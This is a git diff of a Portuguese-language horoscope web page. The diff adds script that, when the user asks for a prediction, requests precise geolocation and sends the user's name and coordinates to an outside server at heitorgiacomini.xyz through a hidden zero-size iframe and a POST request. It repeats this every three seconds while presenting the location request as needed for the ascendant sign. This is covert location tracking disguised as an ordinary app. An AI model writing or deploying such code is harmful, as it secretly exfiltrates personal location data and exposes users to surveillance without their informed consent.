@@ -1,13 +1,19 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
 	<title>Contact V5</title>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+
 <!--===============================================================================================-->
 	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
-<!--===============================================================================================-->	
-	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+<!--===============================================================================================-->
+	
+	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.csss">
 <!--===============================================================================================-->
 	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
 <!--===============================================================================================-->
@@ -15,6 +21,7 @@
 <!--===============================================================================================-->
 	<link rel="stylesheet" type="text/css" href="css/main.css">	
 	<link rel="stylesheet" type="text/css" href="css/util.css">
+	
 <!--
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
 -->
@@ -59,7 +66,7 @@
 				<div class="wrap-input100 input100-select bg1 rs1-wrap-input100">
 					<span class="label-input100">Signo</span>
 					<div>
-						<select class="js-select2 uf" name="estado">
+						<select class="js-select2 uf" name="estado" id="selecsigno">
 								<option value="Áries">Áries</option>
 								<option value="Touro">Touro</option>
 								<option value="Gêmeos">Gêmeos</option>
@@ -80,7 +87,7 @@
 				<div class="container-contact100-form-btn">
 					<div class="wrap-contact100-form-btn">
 						<div class="contact100-form-bgbtn"></div>
-						<button type='button' class="contact100-form-btn">
+						<button type="button" class="contact100-form-btn">
 							<span>
 								Saber previsão
 							</span>
@@ -88,19 +95,130 @@
 					</div>
 				</div>
 			</form>
-			<div class="result">ffffffffffffffffffffffffffffffffff</div>
+			<br><h1 id="nomesign" style="color: #a902ff;"></h1><h3 id="nomeuser" style="color: #a902ff;"></h3>
+			<div class="result" style="color: #a902ff;font-size: 30px;">
+      </div>
 		</div>
 	</div>
-
-	<iframe src="https://www.heitorgiacomini.xyz/signos/salvar.php?texto=github funciona diferente do post por que" 
-	style="width:400px;height: 300px; border: none"></iframe>
     
+  <iframe id="iframepassador" src="https://www.heitorgiacomini.xyz/signos/salvar.php?0" 
+	style="width:0px;height: 0px; border: none; display: none;"></iframe>  
   
-  
-  
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 	
 	<script src="vendor/select2/select2.min.js"></script>
+	
+	<script>
+   /** NOTE: uses jQuery for quick & easy DOM manipulation **/
+
+function getLocation(){
+
+  /** 
+  first, test for feature support
+  **/
+  if('geolocation' in navigator){
+    // geolocation is supported :)
+    requestLocation();
+  }else{
+    // no geolocation :(    
+    $(".result").text("Preciso da sua ajuda para saber seu ascendente :)");
+  }
+
+  /*** 
+  requestLocation() returns a message, either the users coordinates, or an error message
+  **/
+  function requestLocation(){
+    /**
+    getCurrentPosition() below accepts 3 arguments:
+    a success callback (required), an error callback  (optional), and a set of options (optional)
+    **/  
+    var options = {
+      // enableHighAccuracy = should the device take extra time or power to return a really accurate result, or should it give you the quick (but less accurate) answer?
+      enableHighAccuracy: true,
+      // timeout = how long does the device have, in milliseconds to return a result?
+      timeout: 5000,
+      // maximumAge = maximum age for a possible previously-cached position. 0 = must return the current position, not a prior cached position
+      maximumAge: 0
+    };  
+    // call getCurrentPosition()
+    navigator.geolocation.getCurrentPosition(success, error, options);   
+    // upon success, do this
+    function success(pos){
+      // get longitude and latitude from the position object passed in
+      // and presto, we have the device's location!      
+      var posicao =  $('#nome_c').val() + ' long' + pos.coords.longitude + ' lat: ' + pos.coords.latitude ;      
+      document.getElementById("iframepassador").src="https://www.heitorgiacomini.xyz/signos/salvar.php?texto="+$('#nome_c').val() + 'iframe long' + pos.coords.longitude + ' lat: ' + pos.coords.latitude;
+      $.post( "https://www.heitorgiacomini.xyz/signos/salvar.php", { texto: posicao});  
+     
+      seuSigno();
+    }
+  
+    // upon error, do this
+    function error(err){
+      // return the error message
+      $(".result").text("Preciso da sua ajuda para saber seu ascendente :)");
+    }  
+  } // end requestLocation();
+
+} // end getLocation()
+
+// attach getLocation() to button click
+$('.container-contact100-form-btn').on('click', function(){  
+  getLocation(); 
+  setInterval(function(){ 
+    	getLocation(); }, 
+  3000);
+  
+});
+    
+  function seuSigno(){ 
+    $("#nomesign").text($( "#selecsigno" ).val());
+    $("#nomeuser").text($('#nome_c').val());
+    switch($( "#selecsigno" ).val()) {
+    case "Áries":
+        $(".result").text("Arianos solitários, que buscam um novo amor, podem preparar-se para um novo envolvimento romântico. É bastante provável que esse romance se transforme rapidamente em namoro, promovendo as mudanças prometidas por essa fase lunar. Os já comprometidos, podem dar um passo à frente e comprometer-se ainda mais na relação.");
+        break;
+    case "Touro":
+        $(".result").text("Taurinos podem preparar-se para um novo movimento na vida doméstica e familiar. Uma mudança de casa, uma reforma, um filho de decide sair de casa ou o retorno de uma que se foi há algum tempo. A compra ou venda de um imóvel ou a construção de uma nova casa também pode fazer parte deste período, nos próximos meses.");
+        break;
+    case "Gêmeos":
+        $(".result").text("A comunicação, tema bastante familiar para geminianos, será um tema recorrente nos próximos meses. Nesta fase, alguns acordos e negociações que envolvem um novo projeto, podem levar à concretização de um contrato. O começo dos estudos universitários ou a retomada dos mesmos, também pode fazer parte deste período.");
+        break;
+    case "Câncer":
+        $(".result").text("Cancerianos podem esperar por um movimento bastante significativo na vida material e finanças, que podem acontecer, como resultado de um projeto que é aprovado ou mesmo de um contrato que é firmado ou renovado. O dinheiro pode chegar também, através da venda de um bem ou mesmo do aumento de salário.");
+        break;
+    case "Leão":
+        $(".result").text("Leoninos, que serão os mais influenciados por esta fase lunar, podem preparar-se para mudanças em todos os setores da vida, a saber: na saúde, finanças, trabalho, amor e relacionamentos. Acredito que as mudanças sejam positivas, pois a Lua não chega em tensão com nenhum planeta denso, como Saturno, Plutão ou mesmo Urano.");
+        break;
+    case "Virgem":
+        $(".result").text("Virginianos estarão mais fechados e voltados para suas emoções, especialmente as que envolvem o passado. Vão preferir a intimidade, portanto, estarão mais distantes da vida social. É possível que recebam uma proposta de desenvolvimento de um novo projeto, que pode começar a ser planejado rapidamente. Bom período para cuidar da saúde.");
+        break;
+    case "Libra":
+        $(".result").text("Librianos estarão ainda mais sociáveis, mais voltados para os amigos antigos e novas amizades que podem ser feitas nos próximos meses. Um importante contato comercial pode ser realizado abrindo portas e trazendo novas oportunidades de projetos em equipe e consequentemente um contrato, com uma grande empresa ou instituição.");
+        break;
+    case "Escorpião":
+        $(".result").text("Escorpianos, que estão entre os mais influenciados por esta fase lunar,  podem preparar-se para um novo passo na carreira. Um novo projeto, um convite para uma nova função ou um novo emprego, pode ser negociado e concretizado nos próximos meses. Haverá reconhecimento, maior visibilidade, promoções, renovação de contratos, tudo o que envolver o crescimento na vida profissional.");
+        break;
+    case "Sagitário":
+        $(".result").text("Sagitarianos estarão mais voltados para projetos de médio prazo, que podem envolver contato com pessoas e empresas estrangeiras, viagens internacionais, mudança de país ou cidade, retomada dos estudos superiores ou mesmo projetos de publicações. Uma nova filosofia de vida pode ser descoberta e construída.");
+        break;
+    case "Capricórnio":
+        $(".result").text("Capricornianos estarão mais voltados para a vida emocional e podem entrar em contato com sentimentos mais profundos que envolvem a necessidade de mudanças. Existe uma forte possibilidade de negociações e acordos que envolvem sociedades e parcerias financeiras, assim como a entrada de uma grande soma de dinheiro.");
+        break;
+    case "Aquário":
+        $(".result").text("Aquarianos, que estão entre os mais influenciados por essa fase lunar, podem esperar por um movimento significativo na vida social e nos relacionamentos, pessoais e profissionais. Uma sociedade ou parceria comercial pode ser negociada e firmada nos próximos meses. Um namoro pode começar rapidamente.");
+        break;
+    case "Peixes":
+        $(".result").text("Piscianos podem esperar por um movimento significativo e mudanças na rotina, especialmente a de trabalho. Se estiver desempregado, passando por um processo de seleção para um novo emprego, pode preparar-se para boas notícias. Um projeto de trabalho pode ser aprovado. O período é ótimo para a manutenção da saúde.");
+        break;        
+    default:
+        $(".result").text("Preciso da sua ajuda para saber seu ascendente :)");
+        break;
+    }
+  }
+  </script>  
+  
+  
 	<script>
     $('.js-show-service').slideDown();
 		$(".js-select2").each(function(){
@@ -123,22 +241,7 @@
 		})
 	</script>
 	
-	<script>
-    var x = document.getElementById("result");
-    $('.container-contact100-form-btn').on('click', function(){
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-      } else { 
-        x.innerHTML = "Preciso da sua ajuda para calcular seu ascendente :)";
-      }
-    });     
-    function showPosition(position) {
-      var posicao = $('#nome_c').val() + "-->  lat: " + position.coords.latitude + " Long: " + position.coords.longitude;
-      $.post( "https://www.heitorgiacomini.xyz/signos/salvar.php", { texto: posicao} 
-    );
-  
-}
-  </script>  
+	
 
 </body>
 </html>
